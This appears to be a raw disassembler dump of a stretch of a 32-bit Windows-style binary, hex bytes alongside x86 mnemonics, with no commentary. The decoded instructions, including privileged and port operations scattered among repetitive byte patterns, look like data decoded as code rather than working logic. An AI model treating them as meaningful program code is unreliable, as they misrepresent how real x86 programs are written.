  406f1f:	0a 00                	or     (%eax),%al
  406f21:	00 02                	add    %al,(%edx)
  406f23:	00 0c 0b             	add    %cl,(%ebx,%ecx,1)
  406f26:	00 00                	add    %al,(%eax)
  406f28:	01 00                	add    %eax,(%eax)
  406f2a:	87 06                	xchg   %eax,(%esi)
  406f2c:	00 00                	add    %al,(%eax)
  406f2e:	02 00                	add    (%eax),%al
  406f30:	8d 06                	lea    (%esi),%eax
  406f32:	00 00                	add    %al,(%eax)
  406f34:	03 00                	add    (%eax),%eax
  406f36:	94                   	xchg   %eax,%esp
  406f37:	06                   	push   %es
  406f38:	00 00                	add    %al,(%eax)
  406f3a:	04 00                	add    $0x0,%al
  406f3c:	33 0b                	xor    (%ebx),%ecx
  406f3e:	00 00                	add    %al,(%eax)
  406f40:	05 00 44 0b 00       	add    $0xb4400,%eax
  406f45:	00 01                	add    %al,(%ecx)
  406f47:	00 61 0b             	add    %ah,0xb(%ecx)
  406f4a:	00 00                	add    %al,(%eax)
  406f4c:	01 00                	add    %eax,(%eax)
  406f4e:	87 06                	xchg   %eax,(%esi)
  406f50:	00 00                	add    %al,(%eax)
  406f52:	02 00                	add    (%eax),%al
  406f54:	8d 06                	lea    (%esi),%eax
  406f56:	00 00                	add    %al,(%eax)
  406f58:	03 00                	add    (%eax),%eax
  406f5a:	94                   	xchg   %eax,%esp
  406f5b:	06                   	push   %es
  406f5c:	00 00                	add    %al,(%eax)
  406f5e:	01 00                	add    %eax,(%eax)
  406f60:	ff 0a                	decl   (%edx)
  406f62:	00 00                	add    %al,(%eax)
  406f64:	02 00                	add    (%eax),%al
  406f66:	0c 0b                	or     $0xb,%al
  406f68:	00 00                	add    %al,(%eax)
  406f6a:	01 00                	add    %eax,(%eax)
  406f6c:	33 0b                	xor    (%ebx),%ecx
  406f6e:	00 00                	add    %al,(%eax)
  406f70:	02 00                	add    (%eax),%al
  406f72:	44                   	inc    %esp
  406f73:	0b 00                	or     (%eax),%eax
  406f75:	00 01                	add    %al,(%ecx)
  406f77:	00 61 0b             	add    %ah,0xb(%ecx)
  406f7a:	09 00                	or     %eax,(%eax)
  406f7c:	46                   	inc    %esi
  406f7d:	01 13                	add    %edx,(%ebx)
  406f7f:	00 b1 00 46 01 5f    	add    %dh,0x5f014600(%ecx)
  406f85:	02 c1                	add    %cl,%al
  406f87:	00 46 01             	add    %al,0x1(%esi)
  406f8a:	6e                   	outsb  %ds:(%esi),(%dx)
  406f8b:	02 11                	add    (%ecx),%dl
  406f8d:	00 46 01             	add    %al,0x1(%esi)
  406f90:	13 00                	adc    (%eax),%eax
  406f92:	c9                   	leave
  406f93:	00 46 01             	add    %al,0x1(%esi)
  406f96:	13 00                	adc    (%eax),%eax
  406f98:	24 00                	and    $0x0,%al
  406f9a:	46                   	inc    %esi
  406f9b:	01 13                	add    %edx,(%ebx)
  406f9d:	00 2c 00             	add    %ch,(%eax,%eax,1)
  406fa0:	46                   	inc    %esi
  406fa1:	01 13                	add    %edx,(%ebx)
  406fa3:	00 34 00             	add    %dh,(%eax,%eax,1)
  406fa6:	46                   	inc    %esi
  406fa7:	01 13                	add    %edx,(%ebx)
  406fa9:	00 3c 00             	add    %bh,(%eax,%eax,1)
  406fac:	46                   	inc    %esi
  406fad:	01 13                	add    %edx,(%ebx)
  406faf:	00 24 00             	add    %ah,(%eax,%eax,1)
  406fb2:	98                   	cwtl
  406fb3:	02 8b 00 2c 00 98    	add    -0x67ffd400(%ebx),%cl
  406fb9:	02 8b 00 34 00 98    	add    -0x67ffcc00(%ebx),%cl
  406fbf:	02 8b 00 3c 00 98    	add    -0x67ffc400(%ebx),%cl
  406fc5:	02 8b 00 d1 00 46    	add    0x4600d100(%ebx),%cl
  406fcb:	01 13                	add    %edx,(%ebx)
  406fcd:	00 d9                	add    %bl,%cl
  406fcf:	00 46 01             	add    %al,0x1(%esi)
  406fd2:	13 00                	adc    (%eax),%eax
  406fd4:	e1 00                	loope  0x406fd6
  406fd6:	46                   	inc    %esi
  406fd7:	01 bd 02 e9 00 2c    	add    %edi,0x2c00e902(%ebp)
  406fdd:	0d 08 03 19 00       	or     $0x190308,%eax
  406fe2:	3b 02                	cmp    (%edx),%eax
  406fe4:	63 00                	arpl   %eax,(%eax)
  406fe6:	19 00                	sbb    %eax,(%eax)
  406fe8:	44                   	inc    %esp
  406fe9:	02 68 00             	add    0x0(%eax),%ch
  406fec:	29 00                	sub    %eax,(%eax)
  406fee:	4d                   	dec    %ebp
  406fef:	0d 15 03 19 00       	or     $0x190315,%eax
  406ff4:	5d                   	pop    %ebp
  406ff5:	02 71 00             	add    0x0(%ecx),%dh
  406ff8:	f9                   	stc
  406ff9:	00 69 0d             	add    %ch,0xd(%ecx)
  406ffc:	25 03 19 00 46       	and    $0x46001903,%eax
  407001:	01 13                	add    %edx,(%ebx)
  407003:	00 01                	add    %al,(%ecx)
  407005:	01 46 01             	add    %eax,0x1(%esi)
  407008:	35 03 44 00 a8       	xor    $0xa8004403,%eax
  40700d:	02 90 00 09 01 46    	add    0x46010900(%eax),%dl
  407013:	01 b0 03 11 01 46    	add    %esi,0x46011103(%eax)
  407019:	01 13                	add    %edx,(%ebx)
  40701b:	00 19                	add    %bl,(%ecx)
  40701d:	01 46 01             	add    %eax,0x1(%esi)
  407020:	13 00                	adc    (%eax),%eax
  407022:	21 01                	and    %eax,(%ecx)
  407024:	03 0e                	add    (%esi),%ecx
  407026:	bb 03 29 01 19       	mov    $0x19012903,%ebx
  40702b:	0e                   	push   %cs
  40702c:	14 02                	adc    $0x2,%al
  40702e:	31 01                	xor    %eax,(%ecx)
  407030:	28 0e                	sub    %cl,(%esi)
  407032:	c0 03 39             	rolb   $0x39,(%ebx)
  407035:	01 46 01             	add    %eax,0x1(%esi)
  407038:	bd 02 41 01 46       	mov    $0x46014102,%ebp
  40703d:	01 13                	add    %edx,(%ebx)
  40703f:	00 59 00             	add    %bl,0x0(%ecx)
  407042:	e0 02                	loopne 0x407046
  407044:	06                   	push   %es
  407045:	04 21                	add    $0x21,%al
  407047:	01 5d 02             	add    %ebx,0x2(%ebp)
  40704a:	0b 04 69             	or     (%ecx,%ebp,2),%eax
  40704d:	01 d8                	add    %ebx,%eax
  40704f:	0e                   	push   %cs
  407050:	14 02                	adc    $0x2,%al
  407052:	71 01                	jno    0x407055
  407054:	ff 0e                	decl   (%esi)
  407056:	10 04 69             	adc    %al,(%ecx,%ebp,2)
  407059:	01 0f                	add    %ecx,(%edi)
  40705b:	0f 06                	clts
  40705d:	04 71                	add    $0x71,%al
  40705f:	01 14 0f             	add    %edx,(%edi,%ecx,1)
  407062:	17                   	pop    %ss
  407063:	00 31                	add    %dh,(%ecx)
  407065:	01 28                	add    %ebp,(%eax)
  407067:	0e                   	push   %cs
  407068:	17                   	pop    %ss
  407069:	04 51                	add    $0x51,%al
  40706b:	01 46 01             	add    %eax,0x1(%esi)
  40706e:	bd 02 51 01 34       	mov    $0x34015102,%ebp
  407073:	0f 1e 04 79          	nopl   (%ecx,%edi,2)
  407077:	01 42 0f             	add    %eax,0xf(%edx)
  40707a:	71 00                	jno    0x40707c
  40707c:	81 01 59 0f 9f 01    	addl   $0x19f0f59,(%ecx)
  407082:	81 01 60 0f 24 04    	addl   $0x4240f60,(%ecx)
  407088:	89 01                	mov    %eax,(%ecx)
  40708a:	59                   	pop    %ecx
  40708b:	0f 9f 01             	setg   (%ecx)
  40708e:	51                   	push   %ecx
  40708f:	01 75 0f             	add    %esi,0xf(%ebp)
  407092:	13 00                	adc    (%eax),%eax
  407094:	89 01                	mov    %eax,(%ecx)
  407096:	7c 0f                	jl     0x4070a7
  407098:	08 02                	or     %al,(%edx)
  40709a:	89 01                	mov    %eax,(%ecx)
  40709c:	89 0f                	mov    %ecx,(%edi)
  40709e:	17                   	pop    %ss
  40709f:	01 61 01             	add    %esp,0x1(%ecx)
  4070a2:	46                   	inc    %esi
  4070a3:	01 bd 02 61 01 aa    	add    %edi,-0x55fe9efe(%ebp)
  4070a9:	0f 2b 04 21          	movntps %xmm0,(%ecx,%eiz,1)
  4070ad:	01 ba 0f 9f 01 99    	add    %edi,-0x66fe60f1(%edx)
  4070b3:	01 c9                	add    %ecx,%ecx
  4070b5:	0f 14 02             	unpcklps (%edx),%xmm0
  4070b8:	31 01                	xor    %eax,(%ecx)
  4070ba:	28 0e                	sub    %cl,(%esi)
  4070bc:	32 04 61             	xor    (%ecx,%eiz,2),%al
  4070bf:	01 e5                	add    %esp,%ebp
  4070c1:	0f bd 02             	bsr    (%edx),%eax
  4070c4:	59                   	pop    %ecx
  4070c5:	01 f3                	add    %esi,%ebx
  4070c7:	0f 38 04 59 01       	pmaddubsw 0x1(%ecx),%mm3
  4070cc:	f9                   	stc
  4070cd:	0f 13 00             	movlps %xmm0,(%eax)
  4070d0:	a1 01 43 10 41       	mov    0x41104301,%eax
  4070d5:	04 a9                	add    $0xa9,%al
  4070d7:	01 5c 10 47          	add    %ebx,0x47(%eax,%edx,1)
  4070db:	04 b1                	add    $0xb1,%al
  4070dd:	01 6c 10 4d          	add    %ebp,0x4d(%eax,%edx,1)
  4070e1:	04 b1                	add    $0xb1,%al
  4070e3:	01 84 0a 55 04 69 01 	add    %eax,0x1690455(%edx,%ecx,1)
  4070ea:	85 10                	test   %edx,(%eax)
  4070ec:	5b                   	pop    %ebx
  4070ed:	04 31                	add    $0x31,%al
  4070ef:	01 28                	add    %ebp,(%eax)
  4070f1:	0e                   	push   %cs
  4070f2:	62 04 29             	bound  %eax,(%ecx,%ebp,1)
  4070f5:	01 93 10 6a 04 c9    	add    %edx,-0x36fb95f0(%ebx)
  4070fb:	01 b7 10 70 04 21    	add    %esi,0x21047010(%edi)
  407101:	01 bf 10 81 04 c9    	add    %edi,-0x36fb7ef0(%edi)
  407107:	01 ca                	add    %ecx,%edx
  407109:	10 88 04 c9 01 d9    	adc    %cl,-0x26fe36fc(%eax)
  40710f:	10 99 04 71 00 46    	adc    %bl,0x46007104(%ecx)
  407115:	01 ab 04 d9 01 46    	add    %ebp,0x4601d904(%ebx)
  40711b:	01 2b                	add    %ebp,(%ebx)
  40711d:	02 59 00             	add    0x0(%ecx),%bl
  407120:	46                   	inc    %esi
  407121:	01 b3 04 59 00 f3    	add    %esi,-0xcffa6fc(%ebx)
  407127:	0f 13 00             	movlps %xmm0,(%eax)
  40712a:	59                   	pop    %ecx
  40712b:	00 f7                	add    %dh,%bh
  40712d:	10 13                	adc    %dl,(%ebx)
  40712f:	00 61 01             	add    %ah,0x1(%ecx)
  407132:	46                   	inc    %esi
  407133:	01 13                	add    %edx,(%ebx)
  407135:	00 61 01             	add    %ah,0x1(%ecx)
  407138:	fc                   	cld
  407139:	10 bd 02 59 01 09    	adc    %bh,0x9015902(%ebp)
  40713f:	11 ea                	adc    %ebp,%edx
  407141:	04 59                	add    $0x59,%al
  407143:	01 29                	add    %ebp,(%ecx)
  407145:	11 f0                	adc    %esi,%eax
  407147:	04 e1                	add    $0xe1,%al
  407149:	01 38                	add    %edi,(%eax)
  40714b:	11 71 00             	adc    %esi,0x0(%ecx)
  40714e:	99                   	cltd
  40714f:	01 47 11             	add    %eax,0x11(%edi)
  407152:	14 02                	adc    $0x2,%al
  407154:	69 01 53 11 e5 00    	imul   $0xe51153,(%ecx),%eax
  40715a:	e9 01 46 01 13       	jmp    0x1341b760
  40715f:	00 e9                	add    %ch,%cl
  407161:	01 71 11             	add    %esi,0x11(%ecx)
  407164:	01 05 31 01 80 11    	add    %eax,0x11800131
  40716a:	06                   	push   %es
  40716b:	05 f1 01 46 01       	add    $0x14601f1,%eax
  407170:	13 00                	adc    (%eax),%eax
  407172:	f1                   	int1
  407173:	01 96 11 71 00 31    	add    %edx,0x31007111(%esi)
  407179:	01 a5 11 71 00 01    	add    %esp,0x1007111(%ebp)
  40717f:	02 46 01             	add    0x1(%esi),%al
  407182:	bd 02 09 02 03       	mov    $0x3020902,%ebp
  407187:	12 10                	adc    (%eax),%dl
  407189:	05 f9 01 11 12       	add    $0x121101f9,%eax
  40718e:	16                   	push   %ss
  40718f:	05 c9 01 1d 12       	add    $0x121d01c9,%eax
  407194:	1a 05 11 02 34 12    	sbb    0x12340211,%al
  40719a:	23 05 31 01 42 12    	and    0x12420131,%eax
  4071a0:	71 00                	jno    0x4071a2
  4071a2:	f9                   	stc
  4071a3:	01 53 12             	add    %edx,0x12(%ebx)
  4071a6:	2a 05 19 02 68 12    	sub    0x12680219,%al
  4071ac:	13 00                	adc    (%eax),%eax
  4071ae:	59                   	pop    %ecx
  4071af:	01 70 12             	add    %esi,0x12(%eax)
  4071b2:	3d 05 21 02 82       	cmp    $0x82022105,%eax
  4071b7:	12 68 00             	adc    0x0(%eax),%ch
  4071ba:	79 00                	jns    0x4071bc
  4071bc:	46                   	inc    %esi
  4071bd:	01 13                	add    %edx,(%ebx)
  4071bf:	00 79 00             	add    %bh,0x0(%ecx)
  4071c2:	8a 12                	mov    (%edx),%dl
  4071c4:	4b                   	dec    %ebx
  4071c5:	05 29 02 9a 12       	add    $0x129a0229,%eax
  4071ca:	2a 05 31 02 46 01    	sub    0x1460231,%al
  4071d0:	13 00                	adc    (%eax),%eax
  4071d2:	39 02                	cmp    %eax,(%edx)
  4071d4:	46                   	inc    %esi
  4071d5:	01 bd 02 49 00 46    	add    %edi,0x46004902(%ebp)
  4071db:	01 b0 03 31 01 ff    	add    %esi,-0xfecefd(%eax)
  4071e1:	12 51 05             	adc    0x5(%ecx),%dl
  4071e4:	79 00                	jns    0x4071e6
  4071e6:	8a 12                	mov    (%edx),%dl
  4071e8:	58                   	pop    %eax
  4071e9:	05 51 02 09 13       	add    $0x13090251,%eax
  4071ee:	5d                   	pop    %ebp
  4071ef:	05 41 02 5d 02       	add    $0x25d0241,%eax
  4071f4:	71 00                	jno    0x4071f6
  4071f6:	31 00                	xor    %eax,(%eax)
  4071f8:	46                   	inc    %esi
  4071f9:	01 7c 05 39          	add    %edi,0x39(%ebp,%eax,1)
  4071fd:	00 46 01             	add    %al,0x1(%esi)
  407200:	13 00                	adc    (%eax),%eax
  407202:	31 00                	xor    %eax,(%eax)
  407204:	53                   	push   %ebx
  407205:	13 89 05 31 00 69    	adc    0x69003105(%ecx),%ecx
  40720b:	13 89 05 31 00 7c    	adc    0x7c003105(%ecx),%ecx
  407211:	13 8e 05 99 00 46    	adc    0x46009905(%esi),%ecx
  407217:	01 2b                	add    %ebp,(%ebx)
  407219:	02 31                	add    (%ecx),%dh
  40721b:	00 cb                	add    %cl,%bl
  40721d:	04 94                	add    $0x94,%al
  40721f:	05 59 02 46 01       	add    $0x1460259,%eax
  407224:	2b 02                	sub    (%edx),%eax
  407226:	41                   	inc    %ecx
  407227:	00 46 01             	add    %al,0x1(%esi)
  40722a:	a3 05 89 02 a0       	mov    %eax,0xa0028905
  40722f:	13 2a                	adc    (%edx),%ebp
  407231:	05 69 01 a4 13       	add    $0x13a40169,%eax
  407236:	d5 00                	aad    $0x0
  407238:	31 01                	xor    %eax,(%ecx)
  40723a:	b1 13                	mov    $0x13,%cl
  40723c:	b7 05                	mov    $0x5,%bh
  40723e:	69 01 c9 13 bd 05    	imul   $0x5bd13c9,(%ecx),%eax
  407244:	91                   	xchg   %eax,%ecx
  407245:	02 d7                	add    %bh,%dl
  407247:	13 71 00             	adc    0x0(%ecx),%esi
  40724a:	69 01 e7 13 9f 00    	imul   $0x9f13e7,(%ecx),%eax
  407250:	c1 01 5d             	roll   $0x5d,(%ecx)
  407253:	02 71 00             	add    0x0(%ecx),%dh
  407256:	31 01                	xor    %eax,(%ecx)
  407258:	28 0e                	sub    %cl,(%esi)
  40725a:	c3                   	ret
  40725b:	05 a1 02 1a 14       	add    $0x141a02a1,%eax
  407260:	d3 05 99 02 5d 02    	roll   %cl,0x25d0299
  407266:	01 05 a9 02 56 14    	add    %eax,0x145602a9
  40726c:	ed                   	in     (%dx),%eax
  40726d:	05 b1 02 46 01       	add    $0x14602b1,%eax
  407272:	f3 05 b1 02 85 14    	repz add $0x148502b1,%eax
  407278:	fa                   	cli
  407279:	05 69 01 d9 14       	add    $0x14d90169,%eax
  40727e:	d5 00                	aad    $0x0
  407280:	01 02                	add    %eax,(%edx)
  407282:	46                   	inc    %esi
  407283:	01 6e 02             	add    %ebp,0x2(%esi)
  407286:	61                   	popa
  407287:	00 46 01             	add    %al,0x1(%esi)
  40728a:	13 00                	adc    (%eax),%eax
  40728c:	01 02                	add    %eax,(%edx)
  40728e:	e9 14 09 06 c9       	jmp    0xc9467ba7
  407293:	02 03                	add    (%ebx),%al
  407295:	12 0f                	adc    (%edi),%cl
  407297:	06                   	push   %es
  407298:	d1 02                	roll   $1,(%edx)
  40729a:	11 12                	adc    %edx,(%edx)
  40729c:	15 06 c1 02 ed       	adc    $0xed02c106,%eax
  4072a1:	14 1b                	adc    $0x1b,%al
  4072a3:	06                   	push   %es
  4072a4:	61                   	popa
  4072a5:	00 f6                	add    %dh,%dh
  4072a7:	14 20                	adc    $0x20,%al
  4072a9:	06                   	push   %es
  4072aa:	d1 02                	roll   $1,(%edx)
  4072ac:	53                   	push   %ebx
  4072ad:	12 2a                	adc    (%edx),%ch
  4072af:	05 61 00 5d 02       	add    $0x25d0061,%eax
  4072b4:	71 00                	jno    0x4072b6
  4072b6:	31 01                	xor    %eax,(%ecx)
  4072b8:	fd                   	std
  4072b9:	14 68                	adc    $0x68,%al
  4072bb:	00 61 00             	add    %ah,0x0(%ecx)
  4072be:	fd                   	std
  4072bf:	14 68                	adc    $0x68,%al
  4072c1:	00 31                	add    %dh,(%ecx)
  4072c3:	01 08                	add    %ecx,(%eax)
  4072c5:	15 26 06 31 01       	adc    $0x1310626,%eax
  4072ca:	2f                   	das
  4072cb:	15 99 00 d9 02       	adc    $0x2d90099,%eax
  4072d0:	46                   	inc    %esi
  4072d1:	01 bd 02 01 02 46    	add    %edi,0x46020102(%ebp)
  4072d7:	01 3e                	add    %edi,(%esi)
  4072d9:	06                   	push   %es
  4072da:	11 02                	adc    %eax,(%edx)
  4072dc:	35 15 45 06 e1       	xor    $0xe1064515,%eax
  4072e1:	02 46 01             	add    0x1(%esi),%al
  4072e4:	bd 02 e1 02 e9       	mov    $0xe902e102,%ebp
  4072e9:	14 13                	adc    $0x13,%al
  4072eb:	00 a1 01 47 15 66    	add    %ah,0x66154701(%ecx)
  4072f1:	06                   	push   %es
  4072f2:	f1                   	int1
  4072f3:	01 50 15             	add    %edx,0x15(%eax)
  4072f6:	6c                   	insb   (%dx),%es:(%edi)
  4072f7:	06                   	push   %es
  4072f8:	f1                   	int1
  4072f9:	02 7a 15             	add    0x15(%edx),%bh
  4072fc:	70 06                	jo     0x407304
  4072fe:	f9                   	stc
  4072ff:	02 83 15 75 06 01    	add    0x1067515(%ebx),%al
  407305:	03 5d 02             	add    0x2(%ebp),%ebx
  407308:	71 00                	jno    0x40730a
  40730a:	31 01                	xor    %eax,(%ecx)
  40730c:	90                   	nop
  40730d:	15 26 06 31 00       	adc    $0x310626,%eax
  407312:	97                   	xchg   %eax,%edi
  407313:	15 84 06 39 00       	adc    $0x390684,%eax
  407318:	a2 15 8a 06 21       	mov    %al,0x21068a15
  40731d:	01 aa 15 8f 06 09    	add    %ebp,0x9068f15(%edx)
  407323:	03 68 12             	add    0x12(%eax),%ebp
  407326:	13 00                	adc    (%eax),%eax
  407328:	39 00                	cmp    %eax,(%eax)
  40732a:	b8 15 94 06 39       	mov    $0x39069415,%eax
  40732f:	00 c2                	add    %al,%dl
  407331:	15 99 06 39 00       	adc    $0x390699,%eax
  407336:	fd                   	std
  407337:	14 a1                	adc    $0xa1,%al
  407339:	06                   	push   %es
  40733a:	11 03                	adc    %eax,(%ebx)
  40733c:	46                   	inc    %esi
  40733d:	01 2b                	add    %ebp,(%ebx)
  40733f:	02 59 00             	add    0x0(%ecx),%bl
  407342:	46                   	inc    %esi
  407343:	01 a5 06 19 03 f3    	add    %esp,-0xcfce6fa(%ebp)
  407349:	15 ea 00 21 03       	adc    $0x32100ea,%eax
  40734e:	17                   	pop    %ss
  40734f:	16                   	push   %ss
  407350:	bc 06 21 01 5d       	mov    $0x5d012106,%esp
  407355:	02 e1                	add    %cl,%ah
  407357:	01 31                	add    %esi,(%ecx)
  407359:	00 28                	add    %ch,(%eax)
  40735b:	16                   	push   %ss
  40735c:	c3                   	ret
  40735d:	06                   	push   %es
  40735e:	31 00                	xor    %eax,(%eax)
  407360:	2d 16 94 05 21       	sub    $0x21059416,%eax
  407365:	03 0f                	add    (%edi),%ecx
  407367:	0f ea 00             	pminsw (%eax),%mm0
  40736a:	31 00                	xor    %eax,(%eax)
  40736c:	f0 04 84             	lock add $0x84,%al
  40736f:	06                   	push   %es
  407370:	41                   	inc    %ecx
  407371:	00 68 12             	add    %ch,0x12(%eax)
  407374:	13 00                	adc    (%eax),%eax
  407376:	09 03                	or     %eax,(%ebx)
  407378:	37                   	aaa
  407379:	16                   	push   %ss
  40737a:	13 00                	adc    (%eax),%eax
  40737c:	31 00                	xor    %eax,(%eax)
  40737e:	37                   	aaa
  40737f:	16                   	push   %ss
  407380:	13 00                	adc    (%eax),%eax
  407382:	31 00                	xor    %eax,(%eax)
  407384:	68 12 13 00 31       	push   $0x31001312
  407389:	03 40 16             	add    0x16(%eax),%eax
  40738c:	17                   	pop    %ss
  40738d:	00 59 03             	add    %bl,0x3(%ecx)
  407390:	ff 12                	call   *(%edx)
  407392:	f3 06                	repz push %es
  407394:	69 03 f0 16 17 00    	imul   $0x1716f0,(%ebx),%eax
  40739a:	31 00                	xor    %eax,(%eax)
  40739c:	07                   	pop    %es
  40739d:	17                   	pop    %ss
  40739e:	fe 06                	incb   (%esi)
  4073a0:	79 03                	jns    0x4073a5
  4073a2:	18 17                	sbb    %dl,(%edi)
  4073a4:	08 02                	or     %al,(%edx)
  4073a6:	81 03 3d 17 05 07    	addl   $0x705173d,(%ebx)
  4073ac:	81 03 68 17 0a 07    	addl   $0x70a1768,(%ebx)
  4073b2:	81 03 7d 17 06 04    	addl   $0x406177d,(%ebx)
  4073b8:	99                   	cltd
  4073b9:	01 98 17 d5 00 99    	add    %ebx,-0x66ff2ae9(%eax)
  4073bf:	01 a4 17 c0 03 e9 01 	add    %esp,0x1e903c0(%edi,%edx,1)
  4073c6:	ac                   	lods   %ds:(%esi),%al
  4073c7:	17                   	pop    %ss
  4073c8:	6e                   	outsb  %ds:(%esi),(%dx)
  4073c9:	02 59 01             	add    0x1(%ecx),%bl
  4073cc:	f3 0f 11 07          	movss  %xmm0,(%edi)
  4073d0:	29 01                	sub    %eax,(%ecx)
  4073d2:	c5 17                	lds    (%edi),%edx
  4073d4:	18 07                	sbb    %al,(%edi)
  4073d6:	59                   	pop    %ecx
  4073d7:	00 cb                	add    %cl,%bl
  4073d9:	17                   	pop    %ss
  4073da:	13 00                	adc    (%eax),%eax
  4073dc:	59                   	pop    %ecx
  4073dd:	00 f3                	add    %dh,%bl
  4073df:	0f 22 07             	mov    %edi,%cr0
  4073e2:	89 01                	mov    %eax,(%ecx)
  4073e4:	d1 17                	rcll   $1,(%edi)
  4073e6:	14 02                	adc    $0x2,%al
  4073e8:	89 01                	mov    %eax,(%ecx)
  4073ea:	dd 17                	fstl   (%edi)
  4073ec:	27                   	daa
  4073ed:	07                   	pop    %es
  4073ee:	49                   	dec    %ecx
  4073ef:	01 ea                	add    %ebp,%edx
  4073f1:	17                   	pop    %ss
  4073f2:	71 00                	jno    0x4073f4
  4073f4:	b1 01                	mov    $0x1,%cl
  4073f6:	f6 17                	notb   (%edi)
  4073f8:	bd 02 99 03 0a       	mov    $0xa039902,%ebp
  4073fd:	18 2d 07 99 03 1c    	sbb    %ch,0x1c039907
  407403:	18 33                	sbb    %dh,(%ebx)
  407405:	07                   	pop    %es
  407406:	49                   	dec    %ecx
  407407:	03 27                	add    (%edi),%esp
  407409:	18 68 00             	sbb    %ch,0x0(%eax)
  40740c:	49                   	dec    %ecx
  40740d:	03 31                	add    (%ecx),%esi
  40740f:	18 68 00             	sbb    %ch,0x0(%eax)
  407412:	51                   	push   %ecx
  407413:	03 46 01             	add    0x1(%esi),%eax
  407416:	39 07                	cmp    %eax,(%edi)
  407418:	39 03                	cmp    %eax,(%ebx)
  40741a:	65 18 42 07          	sbb    %al,%gs:0x7(%edx)
  40741e:	a9 03 27 18 68       	test   $0x68182703,%eax
  407423:	00 a9 03 31 18 68    	add    %ch,0x68183103(%ecx)
  407429:	00 41 03             	add    %al,0x3(%ecx)
  40742c:	46                   	inc    %esi
  40742d:	01 4b 07             	add    %ecx,0x7(%ebx)
  407430:	39 03                	cmp    %eax,(%ebx)
  407432:	82 18 51             	sbbb   $0x51,(%eax)
  407435:	07                   	pop    %es
  407436:	51                   	push   %ecx
  407437:	03 46 01             	add    0x1(%esi),%eax
  40743a:	4b                   	dec    %ebx
  40743b:	07                   	pop    %es
  40743c:	49                   	dec    %ecx
  40743d:	03 46 01             	add    0x1(%esi),%eax
  407440:	5f                   	pop    %edi
  407441:	07                   	pop    %es
  407442:	39 03                	cmp    %eax,(%ebx)
  407444:	9e                   	sahf
  407445:	18 67 07             	sbb    %ah,0x7(%edi)
  407448:	c1 03 b4             	roll   $0xb4,(%ebx)
  40744b:	18 77 07             	sbb    %dh,0x7(%edi)
  40744e:	a9 03 bd 18 7d       	test   $0x7d18bd03,%eax
  407453:	07                   	pop    %es
  407454:	79 03                	jns    0x407459
  407456:	c2 18 0e             	ret    $0xe18
  407459:	02 39                	add    (%ecx),%bh
  40745b:	03 68 12             	add    0x12(%eax),%ebp
  40745e:	13 00                	adc    (%eax),%eax
  407460:	a9 03 68 12 13       	test   $0x13126803,%eax
  407465:	00 d1                	add    %dl,%cl
  407467:	03 f8                	add    %eax,%edi
  407469:	18 cb                	sbb    %cl,%bl
  40746b:	07                   	pop    %es
  40746c:	d1 03                	roll   $1,(%ebx)
  40746e:	13 19                	adc    (%ecx),%ebx
  407470:	d1 07                	roll   $1,(%edi)
  407472:	d9 03                	flds   (%ebx)
  407474:	18 19                	sbb    %bl,(%ecx)
  407476:	d9 07                	flds   (%edi)
  407478:	e1 03                	loope  0x40747d
  40747a:	2c 19                	sub    $0x19,%al
  40747c:	71 00                	jno    0x40747e
  40747e:	29 00                	sub    %eax,(%eax)
  407480:	35 19 df 07 11       	xor    $0x1107df19,%eax
  407485:	02 40 19             	add    0x19(%eax),%al
  407488:	e6 07                	out    %al,$0x7
  40748a:	79 03                	jns    0x40748f
  40748c:	82 12 bb             	adcb   $0xbb,(%edx)
  40748f:	03 31                	add    (%ecx),%esi
  407491:	01 64 19 06          	add    %esp,0x6(%ecx,%ebx,1)
  407495:	05 79 03 ba 0f       	add    $0xfba0379,%eax
  40749a:	9f                   	lahf
  40749b:	01 81 00 79 19 04    	add    %eax,0x4197900(%ecx)
  4074a1:	08 f1                	or     %dh,%cl
  4074a3:	03 46 01             	add    0x1(%esi),%eax
  4074a6:	13 00                	adc    (%eax),%eax
  4074a8:	f1                   	int1
  4074a9:	03 f3                	add    %ebx,%esi
  4074ab:	0f 13 00             	movlps %xmm0,(%eax)
  4074ae:	f1                   	int1
  4074af:	03 85 19 0a 08 81    	add    -0x7ef7f5e7(%ebp),%eax
  4074b5:	00 91 19 0f 08 54    	add    %dl,0x54080f19(%ecx)
  4074bb:	00 46 01             	add    %al,0x1(%esi)
  4074be:	13 00                	adc    (%eax),%eax
  4074c0:	54                   	push   %esp
  4074c1:	00 c2                	add    %al,%dl
  4074c3:	19 33                	sbb    %esi,(%ebx)
  4074c5:	08 59 01             	or     %bl,0x1(%ecx)
  4074c8:	c6                   	(bad)
  4074c9:	19 39                	sbb    %edi,(%ecx)
  4074cb:	08 59 01             	or     %bl,0x1(%ecx)
  4074ce:	d3 19                	rcrl   %cl,(%ecx)
  4074d0:	71 00                	jno    0x4074d2
  4074d2:	31 01                	xor    %eax,(%ecx)
  4074d4:	e7 19                	out    %eax,$0x19
  4074d6:	9f                   	lahf
  4074d7:	01 5c 00 46          	add    %ebx,0x46(%eax,%eax,1)
  4074db:	01 2b                	add    %ebp,(%ebx)
  4074dd:	02 09                	add    (%ecx),%cl
  4074df:	04 2d                	add    $0x2d,%al
  4074e1:	1a 48 08             	sbb    0x8(%eax),%cl
  4074e4:	29 04 5b             	sub    %eax,(%ebx,%ebx,2)
  4074e7:	1a 76 08             	sbb    0x8(%esi),%dh
  4074ea:	19 04 62             	sbb    %eax,(%edx,%eiz,2)
  4074ed:	1a bd 02 19 04 70    	sbb    0x70041902(%ebp),%bh
  4074f3:	1a b0 03 19 04 86    	sbb    -0x79fbe6fd(%eax),%dh
  4074f9:	1a 89 05 19 04 92    	sbb    -0x6dfbe6fb(%ecx),%cl
  4074ff:	1a bd 02 19 04 a9    	sbb    -0x56fbe6fe(%ebp),%bh
  407505:	1a 7d 08             	sbb    0x8(%ebp),%bh
  407508:	59                   	pop    %ecx
  407509:	03 b5 1a e1 01 31    	add    0x3101e11a(%ebp),%esi
  40750f:	01 bb 1a 06 05 d9    	add    %edi,-0x26faf9e6(%ebx)
  407515:	03 c4                	add    %esp,%eax
  407517:	1a a6 08 d9 03 69    	sbb    0x6903d908(%esi),%ah
  40751d:	0d 1b 06 39 04       	or     $0x439061b,%eax
  407522:	ec                   	in     (%dx),%al
  407523:	1a ac 08 39 04 75 0b 	sbb    0xb750439(%eax,%ecx,1),%ch
  40752a:	b3 08                	mov    $0x8,%bl
  40752c:	49                   	dec    %ecx
  40752d:	04 03                	add    $0x3,%al
  40752f:	1b ca                	sbb    %edx,%ecx
  407531:	08 49 04             	or     %cl,0x4(%ecx)
  407534:	0c 1b                	or     $0x1b,%al
  407536:	d0 08                	rorb   $1,(%eax)
  407538:	31 00                	xor    %eax,(%eax)
